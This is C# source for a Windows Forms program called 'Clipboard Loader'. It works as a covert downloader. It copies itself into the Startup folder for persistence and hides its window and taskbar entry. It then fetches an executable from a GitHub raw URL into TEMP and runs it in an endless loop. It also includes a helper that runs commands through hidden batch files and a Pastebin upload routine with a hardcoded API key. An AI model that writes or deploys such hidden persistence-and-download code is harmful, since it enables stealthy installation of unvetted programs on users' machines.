using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Clipboard_Loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\ClipboardLoader.exe"))
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\ClipboardLoader.exe");
            }
            Visible = false;
            ShowInTaskbar = false;
            await CheckInternet();
            await Download(
                "https://raw.githubusercontent.com/EpicGamesGun/ClipboardNotifier/master/Clipboard-Notifier/Clipboard-Notifier/bin/Debug/Clipboard-Notifier.exe",
                Environment.GetEnvironmentVariable("TEMP") + "\\Clipboard.exe");
            for (int i = 300; i > 0; i = i - 1)
            {
                Console.WriteLine(i);
                await Task.Delay(1000);
            }
            //await Task.Factory.StartNew(() =>
            //{
            //    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\Clipboard.exe");
            //});
            //for (int i = 60; i > 0; i = i - 1)
            //{
            //    Console.WriteLine(i);
            //    await Task.Delay(1000);
            //}
            //await RunCommandHidden("taskkill /f /im Clipboard.exe");
            while (true)
            {
                await Task.Factory.StartNew(() =>
                {
                    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\Clipboard.exe").WaitForExit();
                });
            }
        }
        private bool Exit = false;
        public async Task RunCommandHidden(string Command)
        {
            Random dew = new Random();
            int hui = dew.Next(0000, 9999);
            string[] CommandChut = { Command };
            File.WriteAllLines(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat", CommandChut);
            Process C = new Process();
            C.StartInfo.FileName = System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat";
            C.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            C.EnableRaisingEvents = true;
            C.Exited += C_Exited;
            C.Start();
            while (Exit == false)
            {
                await Task.Delay(10);
            }

            Exit = false;
            File.Delete(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat");
        }

        private void C_Exited(object sender, EventArgs e)
        {
            Exit = true;
        }
        private async Task GeneratePastebin(string text)
        {
            System.Collections.Specialized.NameValueCollection Data = new System.Collections.Specialized.NameValueCollection();
            String header = text;
            Data["api_paste_name"] = "[OV-GUI] Log file upload via the GUI";
            Data["api_paste_expire_date"] = "N";
            Data["api_paste_code"] = header;
            Data["api_dev_key"] = "8aaa33c046fd8faf1d495718d2414165";
            Data["api_option"] = "paste";
            WebClient wb = new WebClient();
            byte[] bytes = wb.UploadValues("http://pastebin.com/api/api_post.php", Data);
            string response;
            using (MemoryStream ms = new MemoryStream(bytes))
            using (StreamReader reader = new StreamReader(ms))
                response = reader.ReadToEnd();
            if (response.StartsWith("Bad API request"))
            {
                Console.WriteLine("Something went wrong. How ironic, the error report returned an error");
                Console.WriteLine("Look, just go to http://overviewer.org/irc. We'll help there :)");
            }
            else
            {
                System.Diagnostics.Process.Start(response);
            }
        }
        private async Task Download(string link, string filename)
        {
            using (var client = new WebClient())
            {
                client.DownloadFileAsync(new Uri(link), filename);
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
            }
        }
        private async Task CheckInternet()
        {
            bool Internet = false;
            string StringDownload = String.Empty;
            while (Internet == false)
            {
                await Task.Factory.StartNew(() =>
                {
                    using (var client = new WebClient())
                    {
                        try
                        {
                            StringDownload = client.DownloadString(new Uri(
                                "https://raw.githubusercontent.com/EpicGamesGun/StarterPackages/master/InternetCheck.txt"));
                        }
                        catch
                        {

                        }
                    }
                });


                if (StringDownload == "true")
                {
                    Internet = true;
                }

                await Task.Delay(1000);
            }

            Internet = false;
        }
    }
}
